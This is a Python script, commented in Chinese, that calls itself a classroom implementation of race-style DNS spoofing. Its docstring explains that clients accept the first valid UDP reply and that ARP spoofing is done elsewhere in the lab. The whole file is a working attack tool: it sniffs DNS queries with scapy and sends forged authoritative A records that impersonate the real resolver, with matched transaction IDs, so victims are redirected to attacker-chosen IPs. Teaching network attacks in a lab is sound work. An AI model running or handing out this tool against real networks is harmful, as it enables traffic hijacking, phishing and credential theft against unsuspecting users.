#!/usr/bin/env python3
"""
DNS 抢答器 —— 抢答式 DNS 投毒（DNS spoofing）的教学实现。

原理
----
DNS 查询走的是 UDP，客户端**只认第一个到达的有效响应**，不校验
「这个响应到底是不是我问的那台服务器发的」。所以只要攻击者能：

  1. 让受害者的 DNS 查询经过自己（本靶场用 ARP 欺骗做到这一点），
  2. 在真正的 DNS 服务器之前，把伪造响应送回去，

受害者就会采信伪造地址。这就是「抢答」，也是 2008 年 Kaminsky
缓存投毒事件的核心机制。

本脚本只做第 2 步。第 1 步由 lab.sh 里的 arpspoof 完成。

每抢答成功一次都会打印一行日志，方便课堂上实时看到攻击发生。
"""
import argparse
import sys

from scapy.all import (DNS, DNSQR, DNSRR, Ether, IP, UDP,  # noqa: E402
                       get_if_hwaddr, sendp, sniff)


def load_rules(path):
    """读 hosts 格式的规则文件： <IP> <域名> [域名...]，支持 *.example.com"""
    exact, wildcard = {}, {}
    with open(path, encoding="utf-8") as fh:
        for line in fh:
            line = line.split("#", 1)[0].strip()
            if not line:
                continue
            parts = line.split()
            if len(parts) < 2:
                continue
            ip, names = parts[0], parts[1:]
            for name in names:
                name = name.lower().rstrip(".")
                if name.startswith("*."):
                    wildcard[name[2:]] = ip
                else:
                    exact[name] = ip
    return exact, wildcard


def make_lookup(exact, wildcard):
    def lookup(qname):
        q = qname.lower().rstrip(".")
        if q in exact:
            return exact[q]
        for suffix, ip in wildcard.items():
            if q == suffix or q.endswith("." + suffix):
                return ip
        return None
    return lookup


def main():
    ap = argparse.ArgumentParser(description="DNS 抢答器（教学用）")
    ap.add_argument("-i", "--iface", required=True, help="监听/发送所用的网卡")
    ap.add_argument("-f", "--hosts", required=True, help="hosts 格式的规则文件")
    ap.add_argument("-q", "--quiet", action="store_true", help="不打印每次抢答")
    args = ap.parse_args()

    exact, wildcard = load_rules(args.hosts)
    lookup = make_lookup(exact, wildcard)
    my_mac = get_if_hwaddr(args.iface)

    print(f"[dns-spoof] 监听 {args.iface}，已载入 {len(exact)} 条精确规则、"
          f"{len(wildcard)} 条通配规则", flush=True)

    def handle(pkt):
        # 只关心「发往 53 端口、还没有被回答」的查询
        if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNSQR)):
            return
        if pkt[UDP].dport != 53:
            return
        if pkt.haslayer(DNS) and pkt[DNS].qr != 0:
            return

        qname = pkt[DNSQR].qname.decode("ascii", "ignore")
        fake_ip = lookup(qname)
        if fake_ip is None:
            return

        # 伪造响应：以太网层回到受害者；IP 层冒充「被查询的那台 DNS 服务器」；
        # 事务 ID 与查询保持一致，否则客户端会丢掉它。
        spoofed = (
            Ether(src=my_mac, dst=pkt[Ether].src) /
            IP(src=pkt[IP].dst, dst=pkt[IP].src) /
            UDP(sport=53, dport=pkt[UDP].sport) /
            DNS(id=pkt[DNS].id, qr=1, aa=1, rd=pkt[DNS].rd, ra=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, type="A",
                         ttl=60, rdata=fake_ip))
        )
        sendp(spoofed, iface=args.iface, verbose=False)
        if not args.quiet:
            print(f"  [抢答] {qname.rstrip('.')} → {fake_ip}"
                  f"   (冒充 {pkt[IP].dst})", flush=True)

    try:
        sniff(iface=args.iface, filter="udp dst port 53",
              prn=handle, store=False)
    except PermissionError:
        sys.exit("[dns-spoof] 需要 root 权限来嗅探和发送原始以太网帧")
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
